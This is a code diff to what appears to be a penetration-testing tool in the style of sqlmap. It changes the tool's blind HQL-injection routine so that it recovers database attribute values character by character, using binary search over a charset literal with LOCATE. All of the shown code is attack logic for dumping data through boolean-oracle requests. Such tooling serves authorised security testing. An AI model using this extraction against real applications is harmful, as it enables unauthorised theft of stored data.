@@ -310,17 +310,25 @@ for _ in xrange(HQL_CHAR_MIN, HQL_CHAR_MAX + 1):
     if _ not in _META_ORDS and _ not in _CHARSET:
         _CHARSET.append(_)
 
+# Charset as an HQL string literal for LOCATE()-based binary search: each character's
+# 1-based index inside this literal is recovered by bisection (~log2(n) requests vs a
+# linear equality scan), and LOCATE is an index lookup so no lexicographic ordering /
+# collation assumption is introduced. URL-structural bytes (%, &, +, #, ?) are excluded
+# because they cannot survive a raw GET/POST value; such a byte is surfaced as '?' (as
+# it was under the previous linear scan). ', ", \ are already excluded above.
+_URL_HOSTILE = set(ord(_) for _ in "%&+#?")
+_CS_LITERAL = "".join(chr(_) for _ in _CHARSET if _ not in _URL_HOSTILE)
 
-def _scalar(entity, attribute, expr, pin, after=None):
+
+def _scalar(entity, attrExpr, pin, after=None):
     """Scalar subquery over a single `entity` row selected by the smallest `pin`
     (optionally the smallest strictly greater than `after`, to walk rows in order).
-    Alias-independent, so it works regardless of the outer query's alias. `expr`
-    wraps the attribute, cast to string so numeric/temporal values extract too."""
+    Alias-independent, so it works regardless of the outer query's alias. `attrExpr`
+    is the already-built selected expression (references CAST(_h.<attr> AS string))."""
 
     bound = "" if after is None else " WHERE _h2.%s>%s" % (pin, after)
-    target = "CAST(_h.%s AS string)" % attribute
     inner = "SELECT %s FROM %s _h WHERE _h.%s=(SELECT MIN(_h2.%s) FROM %s _h2%s)" % (
-        expr % target, entity, pin, pin, entity, bound)
+        attrExpr, entity, pin, pin, entity, bound)
     return "(%s)" % inner
 
 
@@ -328,7 +336,7 @@ def _inferValue(truth, entity, attribute, pin, after=None, maxLen=HQL_MAX_LENGTH
     """Blindly recover one attribute value of the row selected by `pin`/`after`."""
 
     # length first, by binary search
-    lengthExpr = _scalar(entity, attribute, "LENGTH(%s)", pin, after)
+    lengthExpr = _scalar(entity, "LENGTH(CAST(_h.%s AS string))" % attribute, pin, after)
     if not truth("%s>=1" % lengthExpr):
         return ""
 
@@ -343,14 +351,20 @@ def _inferValue(truth, entity, attribute, pin, after=None, maxLen=HQL_MAX_LENGTH
 
     chars = []
     for pos in xrange(1, length + 1):
-        charExpr = _scalar(entity, attribute, "SUBSTRING(%%s,%d,1)" % pos, pin, after)
-        found = None
-        for cp in _CHARSET:
-            literal = chr(cp)
-            if truth("%s='%s'" % (charExpr, literal)):
-                found = literal
-                break
-        chars.append(found if found is not None else "?")
+        # index of this character inside _CS_LITERAL, recovered by binary search
+        idxExpr = _scalar(entity, "LOCATE(SUBSTRING(CAST(_h.%s AS string),%d,1),'%s')" % (attribute, pos, _CS_LITERAL), pin, after)
+        if not truth("%s>=1" % idxExpr):
+            chars.append("?")
+            continue
+
+        lo, hi = 1, len(_CS_LITERAL)
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if truth("%s>=%d" % (idxExpr, mid)):
+                lo = mid
+            else:
+                hi = mid - 1
+        chars.append(_CS_LITERAL[lo - 1])
 
     return "".join(chars)
 
@@ -407,6 +421,8 @@ def _dumpEntity(oracle, place, parameter, entity):
         if not re.match(r"\A\d+\Z", pinValue):
             break
         after = pinValue
+    else:
+        logger.warning("entity '%s' hit the HQL_MAX_RECORDS (%d) cap; some records may be omitted" % (entity, HQL_MAX_RECORDS))
 
     conf.dumper.singleString("HQL: %s parameter '%s' entity '%s' (%d record%s, ordered by %s):\n%s" % (place, parameter, entity, len(rows), "s" if len(rows) != 1 else "", pin, _grid(columns, rows)))
 
